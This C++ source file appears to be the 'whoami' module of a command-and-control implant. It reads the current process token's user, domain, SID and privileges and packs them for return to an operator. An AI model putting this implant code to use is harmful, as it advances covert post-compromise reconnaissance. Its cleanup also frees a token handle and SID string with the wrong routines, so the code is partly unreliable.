#include "../../../includes/core/core.h"
#include "../../../includes/byte/byte.h"
#include "../../../includes/core/tasker.h"
#include "../../../includes/core/tasker/tokens.h"
#include "../../../includes/utils/utils.h"


void do_whoami() {
	INT32 TaskID = packager->Parse4();
	packager->Pack4(TaskID);

	NTSTATUS Stat;
	HANDLE hToken = NULL;
	PTOKEN_USER pTokenUser = NULL;
	PTOKEN_PRIVILEGES pTokenPrivs = NULL;
	CHAR nameBuf[256];
	CHAR domainBuf[256];
	SID_NAME_USE sidType;
	DWORD domainLen = sizeof(domainBuf);
	DWORD nameLen = sizeof(nameBuf);
	DWORD TokenUserLen = 0;
	DWORD TokenPrivsLen = 0;




	LPSTR SidString = NULL;


	Stat = hollow->ntapi.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	if (!NTAPI_SUCCESS(Stat)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)hollow->ntapi.RtlNtStatusToDosError(Stat));
		return;
	}

	hollow->ntapi.NtQueryInformationToken(hToken, TokenUser, NULL, 0, &TokenUserLen);
	pTokenUser = utils::mem::Alloc<TOKEN_USER>(TokenUserLen);

	Stat = hollow->ntapi.NtQueryInformationToken(hToken, TokenUser, pTokenUser, TokenUserLen, &TokenUserLen);
	if (!NTAPI_SUCCESS(Stat)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)hollow->ntapi.RtlNtStatusToDosError(Stat));
		utils::mem::free(pTokenUser);
		return;
	}

	if (!hollow->Win32.ConvertSidToStringSidA(pTokenUser->User.Sid, &SidString)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		utils::mem::free(pTokenUser);
		return;
	}

	if (!hollow->Win32.LookupAccountSidA(NULL, pTokenUser->User.Sid, nameBuf, &nameLen, domainBuf, &domainLen, &sidType)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)utils::win::GetTeb()->LastErrorValue);
		utils::mem::free(pTokenUser);
		return;
	}
	hollow->ntapi.NtQueryInformationToken(hToken, TokenPrivileges, NULL, 0, &TokenPrivsLen);
	pTokenPrivs = utils::mem::Alloc<TOKEN_PRIVILEGES>(TokenPrivsLen);

	Stat = hollow->ntapi.NtQueryInformationToken(hToken, TokenPrivileges, pTokenPrivs, TokenPrivsLen, &TokenPrivsLen);
	if (!NTAPI_SUCCESS(Stat)) {
		packager->Pack4(TASK_FAILED);
		packager->Pack4((INT32)hollow->ntapi.RtlNtStatusToDosError(Stat));
		utils::mem::free(pTokenUser);
		utils::mem::free(pTokenPrivs);
		return;
	}

	packager->Pack4(OUTPUT_NEEDS_PARSE);
	packager->Pack4(PARSE_WHOAMI);
	packager->Pack4((INT32)nameLen);
	packager->PackBytes((PBYTE)nameBuf, (INT32)nameLen);
	packager->Pack4((INT32)domainLen);
	packager->PackBytes((PBYTE)domainBuf, (INT32)domainLen);
	packager->Pack4((INT32)utils::str::strlen(SidString));
	packager->PackBytes((PBYTE)SidString, (INT32)utils::str::strlen(SidString));

	for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
		LUID_AND_ATTRIBUTES Privs = pTokenPrivs->Privileges[i];
		CHAR PrivName[256] = { 0 };
		DWORD PrivNameLen = sizeof(PrivName);
		DWORD PrivStatus = 0;
		if (!hollow->Win32.LookupPrivilegeNameA(NULL, &Privs.Luid, PrivName, &PrivNameLen)) {
			continue;
		}
		if (Privs.Attributes & SE_PRIVILEGE_REMOVED) PrivStatus = 0;
		else if (Privs.Attributes & SE_PRIVILEGE_ENABLED) PrivStatus = 1;
		else if (Privs.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) PrivStatus = 2;
		else PrivStatus = 3;

		packager->Pack4((INT32)PrivNameLen);
		packager->PackBytes((PBYTE)PrivName, PrivNameLen);
		packager->Pack4(PrivStatus);
	}
	packager->Pack4(END_SIG);


	if (pTokenPrivs) { utils::mem::free(pTokenPrivs); }
	if (pTokenUser)  { utils::mem::free(pTokenUser); }
	if (SidString)   { utils::mem::free(SidString); }
	if (hToken)      { utils::mem::free(hToken); }


	return;
}
